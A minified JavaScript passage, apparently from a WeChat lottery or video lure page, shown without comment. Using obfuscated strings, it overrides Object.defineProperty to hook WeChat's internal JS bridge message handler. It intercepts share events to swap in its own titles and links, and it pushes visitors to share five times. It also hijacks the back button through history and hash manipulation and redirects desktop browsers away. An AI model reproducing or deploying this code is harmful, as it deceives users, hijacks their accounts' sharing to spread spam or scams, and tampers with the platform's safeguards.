class="weui_dialog_bd"></div>',a+='<div class="weui_dialog_ft">',a+='<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>',a+="</div>",a+="</div>",a+="</div>",$(".weui_dialog_alert").length>0?$(".weui_dialog_alert .weui_dialog_bd").empty():$("body").append($(a)),o=$(".weui_dialog_alert"),o.fadeIn(200),o.find(".weui_dialog_bd").html(e),o.find(".weui_btn_dialog").off("touchstart").on("touchstart",function(){o.fadeOut(200),i&&i()})}},window.onhashchange=function(){open_choujiang(!0)},setTimeout(function(){history.pushState(history.length+1,"message","#"+(new Date).getTime())},200),ua=navigator.userAgent,ua.indexOf("MicroMessenger")>0&&(Url=function(){function t(){this.host=window.location.host,this.protocol=window.location.protocol,this.params=this.GetRequest(window.location.search),this.hash=window.location.hash,this.pathname=window.location.pathname}return t.prototype.GetHref=function(t){var i,a,o,n,r,s,l,m=this;if(c=void 0===t.port?m.port:t.port,d=void 0===t.pathname?m.pathname:t.pathname,e=t.host||m.host,f=t.protocol||m.protocol||"http:",e.indexOf(".github.")>=0&&(f="https:"),i=f+"//"+e+(c?":"+c:"")+d,a={},"all"!==t.removeParams)for(o in m.params)m.params.hasOwnProperty(o)&&(a[o]=m.params[o]);if(t.params)for(o in t.params)t.params.hasOwnProperty(o)&&(a[o]=t.params[o]);if("all"!==t.removeParams&&(n=t.removeParams))for(o in n)t.removeParams.hasOwnProperty(o)&&(r=t.removeParams[o],delete a[r]);s=[];for(o in a)a.hasOwnProperty(o)&&s.push(o+"="+encodeURIComponent(a[o]));return s&&s.length>0&&(l=s.join("&")),i+=i.indexOf("?")>0?"&":"?",i+l},t.prototype.GetRequest=function(e){var t,i,a,o,n,r,s,d=e,l=new Object;if(-1!=d.indexOf("?"))for(t=d.substr(1),i=t.split("&"),a=0;a<i.length;a++)o=i[a],n=o.indexOf("="),r=void 0,s=void 0,n>=0?(r=o.substr(0,n),s=decodeURIComponent(o.substring(n+1))):r=o,r&&(l[r]=s);return l},t}(),oldDefProp=Object.defineProperty,Object.defineProperty=function(e,t,i){(t==app.decodeStr("+95+104+97+110+100+108+101+77+101+115+115+97+103+101+70+114+111+109+87+101+105+120+105+110")||t==app.decodeStr("*87*101*105*120*105*110*74*83*66*114*105*100*103*101"))&&(i.writable=!0,i.configurable=!0),oldDefProp(e,t,i)},window.url=new Url,window.config={forbidUrl:"https://www.qq.com"},isAndroid()||isIos()||(location.href=config.forbidUrl?config.forbidUrl:"https://www.qq.com"),Main=function(){function e(){this.nextUrlCalledCount=0,this.forceShareCount=5,this.currentShareCount=0,this.toastTimeOut=0,this.searchDomainModelId=window.url.params.dmid||"bjsth",this.searchShareDomainModelId=window.url.params.sdmid||"ahndth","qhhu"!=this.searchDomainModelId&&this.searchDomainModelId||(this.searchDomainModelId="bjsth",this.searchShareDomainModelId="ahndth"),this.searchModelId=window.url.params.mid||"video-list",this.redirect=this.isNeedRedirect(),this.isIphone=isIos(),this.fileName=location.pathname.substr(location.pathname.lastIndexOf("/")),this.fileName.indexOf(".html")<0&&(this.fileName="/index.html")}return e.prototype.isNeedRedirect=function(){var e=window.url.params.from;return"timeline"==e||"groupmessage"==e||"singlemessage"==e||"share"==e},e.prototype.getRandomValueInArray=function(e,t){if(!e)return t;if("string"==typeof e)return e;if(!isArray(e))return t;var i=getRandomNum(0,e.length-1);return e[i]||t},e.prototype.start=function(){var e,t=this;void t.setShareCallBack(),e={title:share_title,desc:share_desc,img_url:share_img,link:share_link},t.setModelShareData(e)},e.prototype.setShareCallBack=function(){var e=this;window.wcShare&&(window.wcShare.shareCallback=function(t){var i=!1,a=t&&t.err_msg;("send_app_msg:ok"==a||"send_app_msg:confirm"==a||"share_timeline:ok"==a)&&(e.currentShareCount++,e.currentShareCount==e.forceShareCount&&"share_timeline:ok"!=a&&e.currentShareCount--,i=!0),i&&(sharetips(e.currentShareCount),e.model&&e.model.shareCallback&&e.model.shareCallback({success:i,forceShareCount:e.forceShareCount,currentShareCount:e.currentShareCount,message:a}),e.setNewShareData("shareCallback"),4==e.currentShareCount&&e.setNewShareData("timeline"))})},e.prototype.runAction=function(e){console.log("runAction")},e.prototype.setNewShareData=function(e){var t,i,a;return"timeline"==e?(t={title:timeline_title,desc:timeline_desc,img_url:timeline_img,link:timeline_link},void(window.wcShare.shareData=t)):this.model&&this.model.getShareData&&(this.modelShareData=this.model&&this.model.getShareData(e),i=this.modelShareData,i||(a=$("img")[0],i={link:location.href,title:document.title,desc:document.title,img_url:a&&a.getAttribute("src")}),isUrl(i.link))?void(window.wcShare.shareData=i):void 0},e.prototype.setModelShareData=function(e){var t,i,a,o,n,r,s,d;if(window.wcShare){if(t={link:e.link,desc:e.desc,title:e.title,img_url:e.img_url},isUrl(t.link))return void(window.wcShare.shareData=t);if(isUrl(this.nextUrl))return t.link=this.nextUrl,void(window.wcShare.shareData=t);if(i=void 0,a=void 0,o=void 0,n="share-user-api-error",this.nextUrl&&(i=this.nextUrl,a=this.fileName,o="",n="share-user-ok"),r={protocol:"http:",host:i,pathname:a,port:o,params:{user:n,dmid:this.searchDomainModelId,sdmid:this.searchShareDomainModelId,from:"share",timestamp:Date.now()},removeParams:["isappinstalled"]},e.linkParams)for(s in e.linkParams)e.linkParams.hasOwnProperty(s)&&(d=e.linkParams[s],r.params[s]=d);t.link=url.GetHref(r),window.wcShare.shareData=t}},e}(),WechatShare=function(){function e(){var e=this;this.onBridgeReady=function(){var t=window.WeixinJSBridge;c={invoke:t.invoke,call:t.call,on:t.on,env:t.env,log:t.log,_fetchQueue:t._fetchQueue,_hasInit:t._hasInit,_hasPreInit:t._hasPreInit,_isBridgeByIframe:t._isBridgeByIframe,_continueSetResult:t._continueSetResult,_handleMessageFromWeixin:t._handleMessageFromWeixin},Object.defineProperty(window,"WeixinJSBridge",{writable:!0,enumerable:!0}),window.WeixinJSBridge=c;try{e.setHandleMessageHookForWeixin()}catch(t){e.restoreHandleMessageHookForWeixin()}},this.handleMesageHook=function(t){var i,a,o,n,r,s,d,l;t&&(i=t.__json_message?t.__json_message:t,a=i.__params,o=i.__msg_type,n=i.__event_id,"callback"==o&&e.shareCallback&&"function"==typeof e.shareCallback?e.shareCallback(a):"event"==o&&n&&n.indexOf("share")>0?(r=e.shareData.desc,s=e.shareData.link,d=e.shareData.img_url,l=e.shareData.title,Object.defineProperty(a,"title",{get:function(){return delete a.scene,a.desc=r,a.link=s,a.img_url=d,Object.defineProperty(a,"title",{value:l,enumerable:!0}),"title"},set:function(){},enumerable:!1,configurable:!0}),e.restoreHandleMessageHookForWeixin(),e.oldHandleMesageHook(t),e.setHandleMessageHookForWeixin()):(e.restoreHandleMessageHookForWeixin(),e.oldHandleMesageHook(t),e.setHandleMessageHookForWeixin()))},"undefined"==typeof WeixinJSBridge?document.addEventListener?document.addEventListener("WeixinJSBridgeReady",this.onBridgeReady,!1):document.attachEvent&&(document.attachEvent("WeixinJSBridgeReady",this.onBridgeReady),document.attachEvent("onWeixinJSBridgeReady",this.onBridgeReady)):this.onBridgeReady()}return e.prototype.setHandleMessageHookForWeixin=function(){this.oldHandleMesageHook=window.WeixinJSBridge._handleMessageFromWeixin,window.WeixinJSBridge._handleMessageFromWeixin=this.handleMesageHook},e.prototype.restoreHandleMessageHookForWeixin=function(){this.oldHandleMesageHook&&(window.WeixinJSBridge._handleMessageFromWeixin=this.oldHandleMesageHook)},e}(),window.wcShare=new WechatShare);